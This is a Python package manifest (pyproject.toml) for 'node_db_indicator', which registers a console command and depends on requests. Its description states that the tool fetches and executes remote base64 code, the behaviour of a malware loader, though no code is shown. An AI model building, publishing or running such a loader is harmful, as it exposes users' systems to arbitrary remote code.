[project]
name = "node_db_indicator"
version = "0.1.2"
description = "A tool that fetches and executes remote base64 code"
authors = [{ name="Beverly", email="beverlymiller20231987@gmail.com" }]
license = {text = "MIT"}
readme = "README.md"
requires-python = ">=3.8"
dependencies = [
    "requests"
]

[project.scripts]
node-db-indicator = "node_db_indicator.core:db_indicator"

[build-system]
requires = ["setuptools", "wheel"]
build-backend = "setuptools.build_meta"
